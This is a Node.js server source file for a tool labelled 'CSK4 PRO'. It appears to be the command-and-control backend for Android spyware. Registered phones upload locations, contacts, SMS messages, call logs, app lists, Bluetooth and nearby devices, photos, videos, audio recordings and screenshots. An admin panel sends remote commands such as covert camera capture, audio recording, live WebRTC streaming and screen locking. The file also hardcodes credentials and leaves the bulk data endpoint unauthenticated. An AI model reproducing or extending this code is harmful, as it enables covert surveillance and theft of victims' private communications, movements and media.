const express = require('express');
const http = require('http');
const path = require('path');
const cors = require('cors');
const multer = require('multer');
const bodyParser = require('body-parser');
const { Server } = require('socket.io');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*' },
  maxHttpBufferSize: 2e8,
  pingTimeout: 60000
});

// ============ CONFIG ============
const CONFIG = {
  ADMIN_USER: 'admin',
  ADMIN_PASS: 'csk4@2024',
  DEVICE_TOKEN: 'CSK4-DEVICE-SECRET-123',
  PORT: process.env.PORT || 4000
};

// ============ MIDDLEWARE ============
app.use(cors());
app.use(bodyParser.json({ limit: '200mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '200mb' }));
app.use(express.static(path.join(__dirname, 'public')));
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

if (!fs.existsSync('./uploads')) fs.mkdirSync('./uploads');

// ============ UPLOAD ============
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, './uploads/'),
  filename: (req, file, cb) => {
    const safe = file.originalname.replace(/[^a-zA-Z0-9.]/g, '_');
    cb(null, Date.now() + '-' + safe);
  }
});
const upload = multer({ storage, limits: { fileSize: 200 * 1024 * 1024 } });

// ============ MEMORY STORAGE ============
let devices = {};
let locations = [];
let contacts = [];
let files = [];
let photos = [];
let videos = [];
let audioRec = [];
let nearbyDevices = [];
let messages = [];
let commands = [];
let deviceInfo = {};
let callLogs = [];
let installedApps = [];
let screenshots = [];
let bluetoothDevices = [];

// ============ DEVICE ENDPOINTS ============

app.post('/api/device/register', (req, res) => {
  const { deviceId, deviceName, token, model, android, battery } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid token' });
  devices[deviceId] = {
    deviceId,
    deviceName: deviceName || 'Unknown',
    model: model || deviceName,
    android: android || 'Unknown',
    battery: battery || 0,
    lastSeen: new Date(),
    online: true,
    ip: req.ip
  };
  io.emit('device-update', devices);
  console.log(`✅ ${deviceName} (${deviceId})`);
  res.json({ success: true });
});

app.post('/api/device/heartbeat', (req, res) => {
  const { deviceId, token, battery } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  if (devices[deviceId]) {
    devices[deviceId].lastSeen = new Date();
    devices[deviceId].online = true;
    if (battery !== undefined) devices[deviceId].battery = battery;
  }
  io.emit('device-update', devices);
  res.json({ success: true });
});

app.post('/api/device/location', (req, res) => {
  const { deviceId, lat, lng, accuracy, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  const entry = { deviceId, lat, lng, accuracy, time: new Date() };
  locations.push(entry);
  if (locations.length > 2000) locations.shift();
  io.emit('new-location', entry);
  res.json({ success: true });
});

app.post('/api/device/contacts', (req, res) => {
  const { deviceId, contacts: list, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  contacts = contacts.filter(c => c.deviceId !== deviceId);
  list.forEach(c => contacts.push({ deviceId, name: c.name, phone: c.phone }));
  io.emit('contacts-update', contacts);
  res.json({ success: true, count: list.length });
});

app.post('/api/device/messages', (req, res) => {
  const { deviceId, messages: list, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  messages = messages.filter(m => m.deviceId !== deviceId);
  list.forEach(m => messages.push({ deviceId, from: m.from, body: m.body, time: m.time, type: m.type }));
  io.emit('messages-update', messages);
  res.json({ success: true });
});

app.post('/api/device/calllogs', (req, res) => {
  const { deviceId, callLogs: list, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  callLogs = callLogs.filter(c => c.deviceId !== deviceId);
  list.forEach(c => callLogs.push({ deviceId, ...c }));
  io.emit('calllogs-update', callLogs);
  res.json({ success: true });
});

app.post('/api/device/apps', (req, res) => {
  const { deviceId, apps, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  installedApps = installedApps.filter(a => a.deviceId !== deviceId);
  apps.forEach(a => installedApps.push({ deviceId, ...a }));
  io.emit('apps-update', installedApps);
  res.json({ success: true });
});

app.post('/api/device/nearby', (req, res) => {
  const { deviceId, devices: list, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  nearbyDevices = nearbyDevices.filter(d => d.deviceId !== deviceId);
  list.forEach(d => nearbyDevices.push({ deviceId, ...d }));
  io.emit('nearby-update', nearbyDevices);
  res.json({ success: true });
});

app.post('/api/device/bluetooth', (req, res) => {
  const { deviceId, devices: list, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  bluetoothDevices = bluetoothDevices.filter(d => d.deviceId !== deviceId);
  list.forEach(d => bluetoothDevices.push({ deviceId, ...d }));
  io.emit('bluetooth-update', bluetoothDevices);
  res.json({ success: true });
});

app.post('/api/device/info', (req, res) => {
  const { deviceId, info, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  deviceInfo[deviceId] = { ...info, time: new Date() };
  io.emit('info-update', deviceInfo);
  res.json({ success: true });
});

app.post('/api/device/upload', upload.single('file'), (req, res) => {
  const { deviceId, type, token } = req.body;
  if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
  if (!req.file) return res.status(400).json({ error: 'No file' });

  const entry = {
    deviceId,
    type: type || 'file',
    filename: req.file.filename,
    originalName: req.file.originalname,
    url: `/uploads/${req.file.filename}`,
    size: req.file.size,
    time: new Date()
  };

  if (type === 'photo') photos.push(entry);
  else if (type === 'video') videos.push(entry);
  else if (type === 'audio') audioRec.push(entry);
  else if (type === 'screenshot') screenshots.push(entry);
  else files.push(entry);

  io.emit('new-file', entry);
  console.log(`📁 ${type}: ${entry.originalName}`);
  res.json({ success: true, file: entry });
});

app.get('/api/device/commands/:deviceId', (req, res) => {
  const pending = commands.filter(c => c.deviceId === req.params.deviceId && c.status === 'pending');
  res.json({ commands: pending });
});

app.post('/api/device/command-done', (req, res) => {
  const { commandId, result } = req.body;
  const cmd = commands.find(c => c.id === commandId);
  if (cmd) { cmd.status = 'done'; cmd.result = result; }
  res.json({ success: true });
});

// ============ ADMIN ENDPOINTS ============

app.post('/api/admin/login', (req, res) => {
  const { username, password } = req.body;
  if (username === CONFIG.ADMIN_USER && password === CONFIG.ADMIN_PASS) {
    res.json({ success: true, token: 'csk4-admin-' + Date.now() });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

app.get('/api/admin/data', (req, res) => {
  res.json({
    devices, locations, contacts, files, photos, videos,
    audio: audioRec, nearby: nearbyDevices, bluetooth: bluetoothDevices,
    messages, callLogs, apps: installedApps, deviceInfo, commands, screenshots,
    stats: {
      totalDevices: Object.keys(devices).length,
      onlineDevices: Object.values(devices).filter(d => d.online).length,
      totalPhotos: photos.length,
      totalVideos: videos.length,
      totalFiles: files.length,
      totalContacts: contacts.length,
      totalLocations: locations.length,
      totalMessages: messages.length,
      totalApps: installedApps.length,
      totalBluetooth: bluetoothDevices.length,
      totalScreenshots: screenshots.length
    }
  });
});

app.post('/api/admin/command', (req, res) => {
  const { deviceId, command, params } = req.body;
  const validCommands = [
    'take_photo_front', 'take_photo_back',
    'record_video_front', 'record_video_back',
    'record_audio',
    'get_location', 'get_contacts', 'get_messages', 'get_calllogs',
    'get_files', 'get_apps', 'get_nearby', 'get_bluetooth', 'get_info',
    'vibrate', 'play_sound', 'flashlight_on', 'flashlight_off',
    'screenshot', 'lock_screen',
    'start_webrtc', 'start_audio_stream', 'stop_webrtc',
    'switch_camera'
  ];
  if (!validCommands.includes(command)) return res.status(400).json({ error: 'Invalid command' });

  const cmd = {
    id: Date.now().toString() + Math.random().toString(36).substr(2, 5),
    deviceId,
    command,
    params: params || {},
    time: new Date(),
    status: 'pending'
  };
  commands.push(cmd);
  io.to(deviceId).emit('command', cmd);
  console.log(`🎮 ${command} → ${deviceId}`);
  res.json({ success: true, command: cmd });
});

app.delete('/api/admin/device/:deviceId', (req, res) => {
  const id = req.params.deviceId;
  delete devices[id];
  [locations, contacts, files, photos, videos, audioRec, messages,
   callLogs, installedApps, screenshots, bluetoothDevices].forEach(arr => {
    for (let i = arr.length - 1; i >= 0; i--) if (arr[i].deviceId === id) arr.splice(i, 1);
  });
  io.emit('device-update', devices);
  res.json({ success: true });
});

app.delete('/api/admin/clear-commands/:deviceId', (req, res) => {
  commands = commands.filter(c => c.deviceId !== req.params.deviceId);
  res.json({ success: true });
});

// ============ SOCKET.IO ============
io.on('connection', (socket) => {
  console.log('🔌', socket.id);

  socket.on('register-device', (id) => {
    socket.join(id);
    console.log('📱 Device:', id);
  });

  socket.on('register-admin', () => {
    socket.join('admin-room');
    console.log('👤 Admin');
  });

  socket.on('webrtc-offer', (data) => {
    io.to(data.target).emit('webrtc-offer', data);
  });
  socket.on('webrtc-answer', (data) => {
    io.to(data.target).emit('webrtc-answer', data);
  });
  socket.on('webrtc-ice', (data) => {
    io.to(data.target).emit('webrtc-ice', data);
  });

  socket.on('disconnect', () => console.log('❌', socket.id));
});

// ============ START ============
server.listen(CONFIG.PORT, '0.0.0.0', () => {
  console.log(`🚀 CSK4 PRO Server running on port ${CONFIG.PORT}`);
  console.log(`   Admin Panel: http://localhost:${CONFIG.PORT}/`);
});